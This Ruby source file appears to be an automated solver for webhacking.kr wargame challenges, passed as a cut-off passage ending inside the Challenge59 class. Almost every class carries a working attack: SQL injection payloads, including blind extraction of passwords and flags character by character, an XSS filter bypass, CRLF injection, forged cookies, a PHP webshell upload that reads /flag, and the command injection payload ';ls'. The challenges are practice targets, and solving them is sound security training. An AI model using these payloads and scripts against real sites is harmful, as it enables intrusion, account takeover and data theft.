# frozen_string_literal: true

require 'digest'
require 'base64'
require 'resolv'
require 'docx'
require 'securerandom'
require 'websocket-eventmachine-client'
require 'json'

module WebhackingKR
  ##
  # Challenge base
  class ChallengeBase
    DATA_DIR = File.join(__dir__, '..', '..', 'data')

    OPENDNS_RESOLVER = 'resolver1.opendns.com'
    OPENDNS_MYIP = 'myip.opendns.com'

    @@successors = []

    class << self
      def inherited(subclass)
        super
        @@successors << subclass
      end

      def successors
        @@successors
      end
    end

    def initialize(shell, wargame, client)
      @shell = shell
      @wargame = wargame
      @client = client

      Dir.mkdir(data_dir) unless Dir.exist?(data_dir)
    end

    def exec; end

    ##
    # Prints a message
    def log(message)
      @shell.log("[challenge#{self.class::CHALLENGE}] #{message}")
    end

    def pwned
      log('Pwned!')
    end

    def failed(message = 'Failed!')
      log(message)
      false
    end

    def solved
      log('Already solved!')
    end

    ##
    # Checks if the challenge has been done
    def check(data)
      n = format('%02d', self.class::CHALLENGE)

      if data =~ /old-#{n} Pwned/
        pwned
        return true
      end

      if data =~ /already solved/
        solved
        return true
      end

      failed
    end

    ##
    # Returns the data directory
    def data_dir
      File.join(DATA_DIR, "challenge#{self.class::CHALLENGE}")
    end

    ##
    # Starts HTTP connection
    def http_start
      @client.start { yield if block_given? }
    end

    ##
    # Sends HTTP GET request
    def get(query, headers = {})
      headers['Cookie'] = join_cookie(headers['Cookie'])
      request = Net::HTTP::Get.new(query, headers)
      begin
        @client.request(request)
      rescue StandardError => e
        raise HTTPError, e
      end
    end

    ##
    # Sends HTTP POST request
    def post(query, data = {}, headers = {})
      headers['Cookie'] = join_cookie(headers['Cookie'])
      request = Net::HTTP::Post.new(query, headers)
      request.set_form_data(data)
      begin
        @client.request(request)
      rescue StandardError => e
        raise HTTPError, e
      end
    end

    ##
    # Uploads a file to the HTTP server
    def upload(query, data = {}, headers = {})
      headers['Cookie'] = join_cookie(headers['Cookie'])
      request = Net::HTTP::Post.new(query, headers)
      request.set_form(
        data,
        'multipart/form-data'
      )
      begin
        @client.request(request)
      rescue StandardError => e
        raise HTTPError, e
      end
    end

    ##
    # Authenticates the flag
    def auth(flag)
      @wargame.auth(flag)
    end

    private

    ##
    # Prepends PHPSESSID to cookie
    def join_cookie(cookie)
      data = ["PHPSESSID=#{@wargame.session_id}"]
      data << cookie if cookie
      data.join('; ')
    end

    ##
    # Determines your own IP address
    def myip
      resolver = Resolv::DNS.new(nameserver: OPENDNS_RESOLVER)
      resolver.getaddress(OPENDNS_MYIP).to_s
    end
  end

  ##
  # Challenge 1
  class Challenge1 < ChallengeBase
    CHALLENGE = 1

    PATH = '/challenge/web-01/'

    def exec
      log('Sending cookie')
      response = get(
        PATH,
        { 'Cookie' => 'user_lv=3.5' }
      )
      check(response.body)
    end
  end

  ##
  # Challenge 3
  class Challenge3 < ChallengeBase
    CHALLENGE = 3

    PATH = '/challenge/web-03/'
    PAYLOAD = "' OR 1=1 #"

    def exec
      log('Submitting answer')
      response = post(
        PATH,
        {
          'answer' => PAYLOAD,
          'id' => @wargame.user_id
        }
      )
      check(response.body)
    end
  end

  ##
  # Challenge 4
  class Challenge4 < ChallengeBase
    CHALLENGE = 4

    PATH = '/challenge/web-04/'
    SALT = 'salt_for_you'
    FROM = 10_000_000
    TO = 99_999_999
    INTERVAL = 300_000
    ROUNDS = 500
    TABLE_FILE = 'table.dat'
    HASH_LENGTH = 20

    def exec
      table_file = File.join(data_dir, TABLE_FILE)
      File.open(table_file, 'w').close unless File.exist?(table_file)
      table_size = File.size(table_file)
      table_size /= HASH_LENGTH
      file = File.open(table_file, 'r+b')
      file.seek(table_size * HASH_LENGTH)
      key = nil
      log("Lookup table: #{table_size} hashes")
      log('Generating lookup table and getting hashes')
      i = FROM + table_size
      loop do
        if (!i.zero? && (i % INTERVAL).zero?) || i >= TO
          file.rewind
          response = get(PATH)
          match = %r(><b>([a-z0-9]{#{HASH_LENGTH * 2}})</b></td>).match(response.body)
          unless match
            failed
            break
          end
          @hash = match[1]
          log(@hash)
          @hash = [@hash].pack('H*')

          n = nil
          until file.eof?
            h = file.read(HASH_LENGTH)
            next unless h == @hash

            n = (file.pos - HASH_LENGTH) / HASH_LENGTH
            break
          end

          if n
            key = "#{n + FROM}#{SALT}"
            break
          end
        end

        h = "#{i}#{SALT}"
        file.write(hash(h))

        i += 1
        break if i > TO
      rescue Interrupt
        file.close
        return
      end

      file.close
      unless key
        failed('Key not found')
        return
      end

      log("Key found: #{key}")
      log('Submitting key')
      response = post(
        PATH,
        { 'key' => key }
      )
      check(response.body)
    end

    private

    def hash(key)
      ROUNDS.times { key = Digest::SHA1.hexdigest(key) }
      [key].pack('H*')
    end
  end

  ##
  # Challenge 5
  class Challenge5 < ChallengeBase
    CHALLENGE = 5

    PATH = '/challenge/web-05/'
    PATH_LOGIN = "#{PATH}mem/login.php"
    PATH_JOIN = "#{PATH}mem/join.php"
    LOGIN = ' admin'
    PASSWORD = 'pw'

    def exec
      log("Registering the user '#{LOGIN}'")
      post(
        PATH_JOIN,
        {
          'id' => LOGIN,
          'pw' => PASSWORD
        }
      )

      log('Logging in')
      response = post(
        PATH_LOGIN,
        {
          'id' => LOGIN,
          'pw' => PASSWORD
        }
      )
      check(response.body)
    end
  end

  ##
  # Challenge 6
  class Challenge6 < ChallengeBase
    CHALLENGE = 6

    PATH = '/challenge/web-06/'
    USER = 'admin'
    PASSWORD = 'nimda'
    ROUNDS = 20

    def exec
      user = encode(USER)
      password = encode(PASSWORD)
      log('Sending cookie')
      response = get(
        PATH,
        { 'Cookie' => "user=#{user}; password=#{password}" }
      )
      check(response.body)
    end

    private

    def encode(data)
      ROUNDS.times { data = Base64.strict_encode64(data) }
      data.tr('12345678', '!@$^&*()')
    end

    def decode(data)
      ROUNDS.times { data = Base64.strict_decode64(data) }
      data.tr('!@$^&*()', '12345678')
    end
  end

  ##
  # Challenge 7
  class Challenge7 < ChallengeBase
    CHALLENGE = 7

    PATH = '/challenge/web-07/'
    QUERY = '?val='
    PAYLOAD = 'SELECT(3))UNION(SELECT(SUBSTR(HEX(34),1,1)))#'

    def exec
      log('Trying send payload')
      loop do
        payload = URI.encode_www_form_component(PAYLOAD)
        response = get("#{PATH}#{QUERY}#{payload}")
        next if response.body =~ /nice try!/

        check(response.body)
        break
      end
    end
  end

  ##
  # Challenge 8
  class Challenge8 < ChallengeBase
    CHALLENGE = 8

    PATH = '/challenge/web-08/'
    USER_AGENT = 'agentx'
    PAYLOAD = "', '', 'admin') #"

    def exec
      log('Sending payload')
      get(
        PATH,
        { 'User-Agent' => "#{USER_AGENT}#{PAYLOAD}" }
      )

      log('Getting page')
      response = get(
        PATH,
        { 'User-Agent' => USER_AGENT }
      )
      check(response.body)
    end
  end

  ##
  # Challenge 10
  class Challenge10 < ChallengeBase
    CHALLENGE = 10

    PATH = '/challenge/code-1/'
    QUERY = '?go='
    PIXEL = '1600px'

    def exec
      response = get(
        "#{PATH}#{QUERY}#{PIXEL}",
        { 'Referer' => "#{Wargame::BASE_URI}#{PATH}" }
      )
      check(response.body)
    end
  end

  ##
  # Challenge 11
  class Challenge11 < ChallengeBase
    CHALLENGE = 11

    PATH = '/challenge/code-2/'
    QUERY = '?val='

    def exec
      log('Determining your own IP address')
      ip = myip
      log("IP: #{ip}")
      val = "1abcde_#{ip}\tp\ta\ts\ts"
      val = URI.encode_www_form_component(val)
      log("Sending value: #{val}")
      response = get("#{PATH}#{QUERY}#{val}")
      check(response.body)
    end
  end

  ##
  # Challenge 14
  class Challenge14 < ChallengeBase
    CHALLENGE = 14

    PATH = '/challenge/js-1/'

    def exec
      url = "#{Wargame::BASE_URI}#{PATH}"
      ul = url.index('.kr')
      ul *= 30
      log('Getting page')
      response = get("#{PATH}?#{ul**2}")
      check(response.body)
    end
  end

  ##
  # Challenge 15
  class Challenge15 < ChallengeBase
    CHALLENGE = 15

    PATH = '/challenge/js-2/'
    QUERY = '?getFlag'

    def exec
      response = get("#{PATH}#{QUERY}")
      check(response.body)
    end
  end

  ##
  # Challenge 16
  class Challenge16 < ChallengeBase
    CHALLENGE = 16

    PATH = '/challenge/js-3/'
    TARGET = "#{124.chr}.php"

    def exec
      response = get("#{PATH}#{TARGET}")
      check(response.body)
    end
  end

  ##
  # Challenge 17
  class Challenge17 < ChallengeBase
    CHALLENGE = 17

    PATH = '/challenge/js-4/'
    UNLOCK = 780_929.71

    def exec
      response = get("#{PATH}?#{UNLOCK}")
      check(response.body)
    end
  end

  ##
  # Challenge 18
  class Challenge18 < ChallengeBase
    CHALLENGE = 18

    PATH = '/challenge/web-32/'
    QUERY = '?no='
    PAYLOAD = "''OR`id`='admin'"

    def exec
      payload = URI.encode_www_form_component(PAYLOAD)
      response = get("#{PATH}#{QUERY}#{payload}")
      check(response.body)
    end
  end

  ##
  # Challenge 19
  class Challenge19 < ChallengeBase
    CHALLENGE = 19

    PATH = '/challenge/js-6/'
    LOGIN = 'admin'

    def exec
      userid = Base64.strict_encode64(encode(LOGIN))
      log('Sending cookie')
      response = get(
        PATH,
        { 'Cookie' => "userid=#{userid}" }
      )
      check(response.body)
    end

    private

    def encode(login)
      login.chars.map { |c| Digest::MD5.hexdigest(c) }.join
    end
  end

  ##
  # Challenge 20
  class Challenge20 < ChallengeBase
    CHALLENGE = 20

    PATH = '/challenge/code-4/'

    def exec
      http_start do
        log('Getting page')
        response = get(PATH)
        match = /name=captcha_ value="([a-zA-Z0-9]{10})"/.match(response.body)
        unless match
          failed
          return
        end

        cookie = response['Set-Cookie'].split('; ')
        st = 0
        cookie.each do |c|
          w = c.split('=')
          next unless w[0] == 'st'

          st = w[1].to_i
          break
        end

        log("Server time: #{st}")
        log("Sending CAPTCHA: #{match[1]}")
        response = post(
          PATH,
          {
            'id' => 'tester',
            'cmt' => 'comment',
            'captcha' => match[1]
          },
          { 'Cookie' => "st=#{st}" }
        )
        check(response.body)
      end
    end
  end

  ##
  # Challenge 21
  class Challenge21 < ChallengeBase
    CHALLENGE = 21

    PATH = '/challenge/bonus-1/'
    PARAM_ID = 'id'
    PARAM_PW = 'pw'
    LOGIN = 'admin'
    PAYLOAD = "' OR (`id` = '#{LOGIN}' AND `pw` LIKE BINARY '$PW$') #"
    ALPHABET =
      ('a'..'z').to_a +
      ('A'..'Z').to_a +
      (0..9).to_a +
      ['_', '-']

    def exec
      password = String.new
      search = true
      log('Searching password')
      while search
        ALPHABET.each_with_index do |char, i|
          payload = PAYLOAD.sub('$PW$', "#{password}#{char}%")
          query = URI.encode_www_form(
            PARAM_ID => 'id',
            PARAM_PW => payload
          )

          response = get("#{PATH}?#{query}")
          unless response.body =~ /wrong password/
            if i == ALPHABET.length - 1
              search = false
              break
            end
            next
          end

          password << char
          log(password)
          break
        end
      end

      if password.empty?
        failed('Password not found')
        return
      end

      log("Password found: #{password}")
      log('Logging in')
      query = URI.encode_www_form(
        PARAM_ID => LOGIN,
        PARAM_PW => password
      )
      response = get("#{PATH}?#{query}")
      check(response.body)
    end
  end

  ##
  # Challenge 23
  class Challenge23 < ChallengeBase
    CHALLENGE = 23

    PATH = '/challenge/bonus-3/'
    PARAM_QUERY = 'code'
    PAYLOAD = '<script>alert(1);</script>'

    def exec
      payload = String.new
      PAYLOAD.each_char { |char| payload << "#{char}\x00" }
      query = URI.encode_www_form(PARAM_QUERY => payload)
      log('Sending payload')
      response = get("#{PATH}?#{query}")
      check(response.body)
    end
  end

  ##
  # Challenge 24
  class Challenge24 < ChallengeBase
    CHALLENGE = 24

    PATH = '/challenge/bonus-4/'
    PAYLOAD = 'REMOTE_ADDR=10.270...00...00...1'

    def exec
      log('Sending payload')
      response = get(
        PATH,
        { 'Cookie' => PAYLOAD }
      )
      check(response.body)
    end
  end

  ##
  # Challenge 26
  class Challenge26 < ChallengeBase
    CHALLENGE = 26

    PATH = '/challenge/web-11/'
    PARAM_ID = 'id'
    LOGIN = 'admin'

    def exec
      payload = String.new
      LOGIN.each_char { |char| payload << "%#{char.ord.to_s(16)}" }
      query = URI.encode_www_form(PARAM_ID => payload)
      log('Sending payload')
      response = get("#{PATH}?#{query}")
      check(response.body)
    end
  end

  ##
  # Challenge 27
  class Challenge27 < ChallengeBase
    CHALLENGE = 27

    PATH = '/challenge/web-12/'
    PARAM_NO = 'no'
    PAYLOAD = "2)OR`no`>'1'--\t"

    def exec
      query = URI.encode_www_form(PARAM_NO => PAYLOAD)
      response = get("#{PATH}?#{query}")
      check(response.body)
    end
  end

  ##
  # Challenge 32
  class Challenge32 < ChallengeBase
    CHALLENGE = 32

    PATH = '/challenge/code-5/'
    QUERY = '?hit='
    AMOUNT = 100

    def exec
      log("Hitting page #{AMOUNT} times")
      AMOUNT.times { get("#{PATH}#{QUERY}#{@wargame.user_id}") }
      response = get(PATH)
      check(response.body)
    end
  end

  ##
  # Challenge 33
  class Challenge33 < ChallengeBase
    CHALLENGE = 33

    PATH = '/challenge/bonus-6/'
    LEVEL2_PATH = "#{PATH}lv2.php"
    LEVEL3_PATH = "#{PATH}33.php"
    LEVEL4_PATH = "#{PATH}l4.php"
    LEVEL5_PATH = "#{PATH}md555.php"
    LEVEL6_PATH = "#{PATH}gpcc.php"
    LEVEL7_PATH = "#{PATH}wtff.php"
    LEVEL8_PATH = "#{PATH}ipt.php"
    LEVEL9_PATH = "#{PATH}nextt.php"
    LEVEL10_PATH = "#{PATH}forfor.php"
    LEVEL10_DIR = "#{PATH}answerip/"

    def exec
      query = URI.encode_www_form('get' => 'hehe')
      log('Level 1')
      log('Sending GET query')
      response = get("#{PATH}?#{query}")
      unless response.body =~ /Next/
        failed
        return
      end

      log('Level 2')
      log('Sending POST query')
      response = post(
        LEVEL2_PATH,
        {
          'post' => 'hehe',
          'post2' => 'hehe2'
        }
      )
      unless response.body =~ /Next/
        failed
        return
      end

      log('Level 3')
      log('Determining your own IP address')
      ip = myip
      log("IP: #{ip}")
      query = URI.encode_www_form('myip' => ip)
      log('Sending query')
      response = get("#{LEVEL3_PATH}?#{query}")
      unless response.body =~ /Next/
        failed
        return
      end

      log('Level 4')
      log('Getting server timestamp')
      response = get(LEVEL4_PATH)
      unless response.body =~ /hint : (\d+)/
        failed
        return
      end
      log("Server timestamp: #{Regexp.last_match[1]}")
      time = Time.now.to_i + 1
      log("Timestamp: #{time}")
      query = URI.encode_www_form(
        'password' => Digest::MD5.hexdigest(time.to_s)
      )
      log('Sending MD5 hashed password')
      response = get("#{LEVEL4_PATH}?#{query}")
      unless response.body =~ /Next/
        failed
        return
      end

      log('Level 5')
      query = URI.encode_www_form('imget' => 1)
      log('Sending query')
      response = post(
        "#{LEVEL5_PATH}?#{query}",
        { 'impost' => 1 },
        { 'Cookie' => 'imcookie=1' }
      )
      unless response.body =~ /Next/
        failed
        return
      end

      log('Level 6')
      user_agent = 'Agent'
      log('Determining your own IP address')
      ip = myip
      log("IP: #{ip}")
      ip = Digest::MD5.hexdigest(ip)
      kk = Digest::MD5.hexdigest(user_agent)
      log('Sending query')
      response = post(
        LEVEL6_PATH,
        { 'kk' => kk },
        {
          'User-Agent' => user_agent,
          'Cookie' => "test=#{ip}"
        }
      )
      unless response.body =~ /Next/
        failed
        return
      end

      log('Level 7')
      log('Determining your own IP address')
      ip = myip
      log("IP: #{ip}")
      ip.delete!('.')
      query = URI.encode_www_form(ip => ip)
      log('Sending query')
      response = get("#{LEVEL7_PATH}?#{query}")
      unless response.body =~ /Next/
        failed
        return
      end

      log('Level 8')
      query = URI.encode_www_form('addr' => '127.0.0.1')
      log('Sending query')
      response = get("#{LEVEL8_PATH}?#{query}")
      unless response.body =~ /Next/
        failed
        return
      end

      log('Level 9')
      answer = String.new
      97.step(122, 2) { |i| answer << i.chr }
      query = URI.encode_www_form('ans' => answer)
      log('Sending query')
      response = get("#{LEVEL9_PATH}?#{query}")
      unless response.body =~ /Next/
        failed
        return
      end

      log('Level 10')
      log('Determining your own IP address')
      ip = myip
      log("IP: #{ip}")
      i = 0
      while i <= ip.length
        ip.gsub!(i.to_s, i.to_s.ord.to_s)
        i += 1
      end
      ip.delete!('.')
      ip = ip[0..9]
      answer = ip.to_f / 2
      answer = answer.to_s.delete('.')
      log("Answer: #{answer}")
      log('Getting page')
      get(LEVEL10_PATH)
      log('Getting answer page')
      response = get("#{LEVEL10_DIR}#{answer}_#{ip}.php")
      check(response.body)
    end
  end

  ##
  # Challenge 35
  class Challenge35 < ChallengeBase
    CHALLENGE = 35

    PATH = '/challenge/web-17/'
    PARAM_ID = 'id'
    PARAM_PHONE = 'phone'
    LOGIN = 'admin'
    PAYLOAD = "1), ('#{LOGIN}', '$IP$', 1"

    def exec
      log('Determining your own IP address')
      ip = myip
      log("IP: #{ip}")

      payload = PAYLOAD.sub('$IP$', ip)
      query = URI.encode_www_form(
        PARAM_ID => 'guest',
        PARAM_PHONE => payload
      )
      log('Sending payload')
      response = get("#{PATH}?#{query}")
      check(response.body)
    end
  end

  ##
  # Challenge 36
  class Challenge36 < ChallengeBase
    CHALLENGE = 36

    PATH = '/challenge/bonus-8/'
    FILE = '.index.php.swp'

    def exec
      log('Getting file')
      response = get("#{PATH}#{FILE}")
      match = /(FLAG\{.*\})/.match(response.body)
      unless match
        failed
        return
      end

      log(match[1])
      check(auth(match[1]))
    end
  end

  ##
  # Challenge 38
  class Challenge38 < ChallengeBase
    CHALLENGE = 38

    PATH = '/challenge/bonus-9/'
    PATH_ADMIN = "#{PATH}admin.php"
    PARAM_ID = 'id'
    PAYLOAD = "tester\r\n$IP$:admin"

    def exec
      log('Determining your own IP address')
      ip = myip
      log("IP: #{ip}")
      payload = PAYLOAD.sub('$IP$', ip)
      log('Sending payload')
      post(
        PATH,
        { PARAM_ID => payload }
      )

      log('Getting admin page')
      response = get(PATH_ADMIN)
      check(response.body)
    end
  end

  ##
  # Challenge 39
  class Challenge39 < ChallengeBase
    CHALLENGE = 39

    PATH = '/challenge/bonus-10/'
    PARAM_ID = 'id'
    PAYLOAD = "1             '"

    def exec
      log('Sending payload')
      response = post(
        PATH,
        { PARAM_ID => PAYLOAD }
      )
      check(response.body)
    end
  end

  ##
  # Challenge 40
  class Challenge40 < ChallengeBase
    CHALLENGE = 40

    PATH = '/challenge/web-29/'
    PARAM_NO = 'no'
    PARAM_ID = 'id'
    PARAM_PW = 'pw'
    PARAM_AUTH = 'auth'
    LOGIN = 'admin'
    PAYLOAD = '(0)||(`id`=(0x$LOGIN$)&&`pw`LIKE(BINARY(0x$PASSWORD$)))#'
    ALPHABET =
      ('a'..'z').to_a +
      ('A'..'Z').to_a +
      ('0'..'9').to_a +
      ['_', '-']

    def exec
      password = String.new
      log('Searching password')
      search = true
      while search
        ALPHABET.each.with_index do |char, i|
          payload = PAYLOAD.dup
          c = char.sub('_', '\\_')
          payload.sub!('$LOGIN$', LOGIN.unpack1('H*'))
          payload.sub!('$PASSWORD$', "#{password}#{c}%".unpack1('H*'))
          query = URI.encode_www_form(
            PARAM_NO => payload,
            PARAM_ID => 'guest',
            PARAM_PW => 'guest'
          )
          response = get("#{PATH}?#{query}")
          match = /#{PARAM_AUTH}/.match(response.body)
          unless match
            next if ALPHABET.length != i + 1

            search = false
            break
          end

          password << char
          log(password)
          break
        end
      end

      if password.empty?
        failed('Password not found')
        return
      end

      log("Password found: #{password}")
      log('Authenticating')
      query = URI.encode_www_form(PARAM_AUTH => password)
      response = get("#{PATH}?#{query}")
      check(response.body)
    end
  end

  ##
  # Challenge 41
  class Challenge41 < ChallengeBase
    CHALLENGE = 41

    PATH = '/challenge/web-19/'
    PARAM_UP = 'up'

    def exec
      log('Determining upload directory')
      file_name = 'x' * 256
      response = upload(
        PATH,
        [[PARAM_UP, '', { filename: file_name }]]
      )
      unless response.body =~ %r{copy\(\./(.*)/#{file_name}\)}
        failed
        return
      end

      upload_dir = Regexp.last_match(1)
      file_name = 'flag'
      path = "#{upload_dir}/#{file_name}"
      log("Directory: #{upload_dir}")
      log('Uploading file')
      upload(
        PATH,
        [[PARAM_UP, '', { filename: file_name }]]
      )

      log('Getting file')
      response = get("#{PATH}#{path}")
      unless response.body =~ /(FLAG\{.*\})/
        failed
        return
      end

      log(Regexp.last_match[1])
      check(auth(Regexp.last_match[1]))
    end
  end

  ##
  # Challenge 42
  class Challenge42 < ChallengeBase
    CHALLENGE = 42

    PATH = '/challenge/web-20/'
    PARAM_DOWN = 'down'
    FILE = 'flag.docx'

    def exec
      file = Base64.strict_encode64(FILE)
      query = URI.encode_www_form(PARAM_DOWN => file)
      log("Getting file #{FILE}")
      response = get("#{PATH}?#{query}")
      doc = Docx::Document.open(response.body)
      match = /(FLAG\{.*\})/.match(doc.paragraphs[0].to_s)
      unless match
        failed
        return
      end

      log(match[1])
      check(auth(match[1]))
    end
  end

  ##
  # Challenge 43
  class Challenge43 < ChallengeBase
    CHALLENGE = 43

    PORT = 10_004
    PATH = '/'
    PARAM_FILE = 'file'
    UPLOAD_DIR = 'upload'
    PAYLOAD = "<?php echo file_get_contents('/flag'); ?>"

    def initialize(*)
      super
      uri = URI.parse(Wargame::BASE_URI)
      @client = Net::HTTP.new(uri.host, PORT)
    end

    def exec
      file_name = "#{SecureRandom.alphanumeric(10)}.php"
      log("Uploading file #{file_name}")
      response = upload(
        PATH,
        [[PARAM_FILE, PAYLOAD, { filename: file_name, content_type: 'image/png' }]]
      )
      unless response.body =~ /Done!/
        failed
        return
      end

      log('Getting file')
      response = get("#{PATH}#{UPLOAD_DIR}/#{file_name}")
      unless response.body =~ /(FLAG\{.*\})/
        failed
        return
      end
      flag = Regexp.last_match(1)
      log(flag)
      check(auth(flag))
    end
  end

  ##
  # Challenge 44
  class Challenge44 < ChallengeBase
    CHALLENGE = 44

    PORT = 10_005
    PATH = '/'
    PARAM_ID = 'id'
    PAYLOAD = "';ls'"

    def initialize(*)
      super
      uri = URI(Wargame::BASE_URI)
      @client = Net::HTTP.new(uri.host, PORT)
    end

    def exec
      log('Sending payload')
      response = post(
        PATH,
        { PARAM_ID => PAYLOAD }
      )
      unless response.body =~ /(flag_.*)\n/
        failed
        return
      end

      file_name = Regexp.last_match(1)
      log("Filename: #{file_name}")
      log('Getting file')
      response = get("#{PATH}#{file_name}")
      unless response.body =~ /(FLAG\{.*\})/
        failed
        return
      end

      flag = Regexp.last_match(1)
      log(flag)
      check(auth(flag))
    end
  end

  ##
  # Challenge 45
  class Challenge45 < ChallengeBase
    CHALLENGE = 45

    PATH = '/challenge/web-22/'
    PARAM_ID = 'id'
    PARAM_PW = 'pw'
    LOGIN = 'admin'
    PAYLOAD = "\xbf' OR `id` LIKE 0x$HEX$ #"

    def exec
      payload = PAYLOAD.sub('$HEX$', LOGIN.unpack1('H*'))
      query = URI.encode_www_form(
        PARAM_ID => payload,
        PARAM_PW => 'password'
      )
      log('Sending payload')
      response = get("#{PATH}?#{query}")
      check(response.body)
    end
  end

  ##
  # Challenge 46
  class Challenge46 < ChallengeBase
    CHALLENGE = 46

    PATH = '/challenge/web-23/'
    PARAM_LV = 'lv'
    LOGIN = 'admin'
    PAYLOAD = '(0)OR`id`=0b$BIN$'

    def exec
      payload = PAYLOAD.sub('$BIN$', LOGIN.unpack1('B*'))
      query = URI.encode_www_form(PARAM_LV => payload)
      log('Sending payload')
      response = get("#{PATH}?#{query}")
      check(response.body)
    end
  end

  ##
  # Challenge 49
  class Challenge49 < ChallengeBase
    CHALLENGE = 49

    PATH = '/challenge/web-24/'
    PARAM_LV = 'lv'
    LOGIN = 'admin'
    PAYLOAD = '0||`id`=0x$HEX$'

    def exec
      payload = PAYLOAD.sub('$HEX$', LOGIN.unpack1('H*'))
      query = URI.encode_www_form(PARAM_LV => payload)
      log('Sending payload')
      response = get("#{PATH}?#{query}")
      check(response.body)
    end
  end

  ##
  # Challenge 51
  class Challenge51 < ChallengeBase
    CHALLENGE = 51

    PATH = '/challenge/bonus-13/'
    PARAM_ID = 'id'
    PARAM_PW = 'pw'
    RANDOM_MAX = 6
    PAYLOAD = "'OR'"

    def exec
      log('Searching MD5 hash')
      password = nil
      hash = nil
      i = s = 0
      seed = SecureRandom.alphanumeric(RANDOM_MAX)
      time = Time.now
      loop do
        password = "#{seed}#{s}"
        hash = Digest::MD5.digest(password.to_s)
        i += 1
        if Time.now - time >= 1
          time = Time.now
          log("#{i}/sec") if (time.to_i % 60).zero?
          i = 0
        end

        break if hash.include?(PAYLOAD) && hash =~ /^[^']*#{PAYLOAD}[1-9][^']*$/

        s += 1
      end

      log("Hash found: #{hash.unpack1('H*')}")
      log("Password: #{password}")
      log('Logging in')
      @wargame.login
      log('Sending password')
      response = post(
        PATH,
        {
          PARAM_ID => 'id',
          PARAM_PW => password
        }
      )
      check(response.body)
    end
  end

  ##
  # Challenge 53
  class Challenge53 < ChallengeBase
    CHALLENGE = 53

    PATH = '/challenge/web-28/'
    PARAM_VAL = 'val'
    PARAM_ANSWER = 'answer'
    PAYLOAD = '1 LIMIT 1 PROCEDURE ANALYSE()'

    def exec
      query = URI.encode_www_form(PARAM_VAL => PAYLOAD)
      log('Sending payload')
      response = get("#{PATH}?#{query}")
      unless response.body =~ /webhacking\.(\w+)\.a<hr>/
        failed('Table name not found')
        return
      end

      table_name = Regexp.last_match(1)
      log("Table name found: #{table_name}")
      query = URI.encode_www_form(PARAM_ANSWER => table_name)
      response = get("#{PATH}?#{query}")
      check(response.body)
    end
  end

  ##
  # Challenge 54
  class Challenge54 < ChallengeBase
    CHALLENGE = 54

    PATH = '/challenge/bonus-14/'
    QUERY = '?m='

    def exec
      i = 0
      password = String.new
      log('Getting password')
      loop do
        response = get(
          "#{PATH}#{QUERY}#{i}",
          { 'Referer' => "#{Wargame::BASE_URI}#{PATH}" }
        )
        break if response.body.empty?

        log(response.body)
        password << response.body
        i += 1
      end

      log("Password: #{password}")
      check(auth(password))
    end
  end

  ##
  # Challenge 55
  class Challenge55 < ChallengeBase
    CHALLENGE = 55

    PATH = '/challenge/web-31/'
    PATH_RANK = "#{PATH}rank.php"
    PARAM_SCORE = 'score'
    PARAM_MX = 'mx'
    PARAM_MY = 'my'
    RANDOM_MAX = (2**32) / 2
    PAYLOAD = '$SCORE$ AND $COLUMN$ LIKE BINARY 0x$HEX$'
    PAYLOAD_COLUMN = '$SCORE$ LIMIT $OFFSET$, 1 PROCEDURE ANALYSE()'
    COLUMNS_EXCLUDE = %w[id score].freeze
    ALPHABET = ('!'..'~').to_a

    def exec
      score = SecureRandom.rand(RANDOM_MAX)
      mx = SecureRandom.rand(RANDOM_MAX)
      my = SecureRandom.rand(RANDOM_MAX)
      log("Sending score: #{score}")
      post(
        PATH,
        {
          PARAM_SCORE => score,
          PARAM_MX => mx,
          PARAM_MY => my
        }
      )

      log('Searching a column name')
      column = nil
      http_start do
        offset = 0
        loop do
          payload = PAYLOAD_COLUMN.sub('$SCORE$', score.to_s)
          payload = payload.sub('$OFFSET$', offset.to_s)
          query = URI.encode_www_form(
            PARAM_SCORE => payload
          )
          response = get("#{PATH_RANK}?#{query}")
          if response.body =~ %r{id : webhacking\.chall55\.(\w+) //} && !COLUMNS_EXCLUDE.include?(Regexp.last_match(1))
            column = Regexp.last_match(1)
            break
          end
          offset += 1
        end
      end

      unless column
        failed('Column not found')
        return
      end

      log("Column found: #{column}")
      log('Searching a flag')
      flag = String.new
      search = true
      http_start do
        while search
          ALPHABET.each.with_index do |char, i|
            c = char.dup
            c.prepend('\\') if ['_', '%', '\\'].include?(c)
            f = "#{flag}#{c}%"
            payload = PAYLOAD.sub('$SCORE$', score.to_s)
            payload = payload.sub('$COLUMN$', column)
            payload = payload.sub('$HEX$', f.unpack1('H*'))
            query = URI.encode_www_form(
              PARAM_SCORE => payload
            )
            response = get("#{PATH_RANK}?#{query}")
            if response.body =~ %r{// #{score}</center>}
              flag << char
              log(flag)
              break
            end

            search = i != ALPHABET.length - 1
          end
        end
      end

      if flag.empty?
        failed('Flag not found')
        return
      end

      log("Flag found: #{flag}")
      check(auth(flag))
    end
  end

  ##
  # Challenge 58
  class Challenge58 < ChallengeBase
    CHALLENGE = 58

    PORT = 10_007
    PATH = '/socket.io/'
    PARAM_EIO = 'EIO'
    PARAM_TRANSPORT = 'transport'
    SOCKET_EIO = 3
    SOCKET_TRANSPORT = 'websocket'
    PAYLOAD = ['cmd', 'admin:flag'].freeze

    def exec
      EM.run do
        uri = URI(Wargame::BASE_URI)
        uri.scheme = 'ws'
        uri.port = PORT
        uri.path = PATH
        uri.query = URI.encode_www_form(
          PARAM_EIO => SOCKET_EIO,
          PARAM_TRANSPORT => SOCKET_TRANSPORT
        )
        log('Connecting to the websocket')
        ws = WebSocket::EventMachine::Client.connect(uri: uri.to_s)

        ws.onopen do
          log('Connected')
        end

        ws.onclose do
          log('Disconnected')
          return
        end

        ws.onmessage do |message|
          case message[0]
          when '0'
            log('Socket.IO is opened')
            data = JSON.parse(message[1..-1])
            EventMachine::PeriodicTimer.new(data['pingInterval'] / 1000) do
              ws.send(2)
            end

            log('Sending payload')
            data = JSON.generate(PAYLOAD)
            ws.send("4#{PAYLOAD.length}#{data}")

          when '4'
            if message[1].to_i.positive?
              data = JSON.parse(message[2..-1])
              unless data.instance_of?(Array) && data[1] =~ /^FLAG{.*}$/
                failed
                ws.close
              end

              log("Flag: #{data[1]}")
              check(auth(data[1]))
              ws.close
            end
          end
        end
      end
    end
  end

  ##
  # Challenge 59
  class Challenge59 < ChallengeBase
    CHALLENGE = 59

    PATH = '/challenge/web-36/'
    PARAM_ID = 'id'
    PARAM_PHONE = 'phone'
    PARAM_LID = 'lid'
    PARAM_LPHONE = 'lphone'
    ID = 'nimda'
    PHONE = 1
    PAYLOAD = "#{PHONE},REVERSE(`id`))-- "

    def exec
      log('Registering the ID')
      post(
        PATH,
        {
          PARAM_ID => ID,
          PARAM_PHONE => PAYLOAD
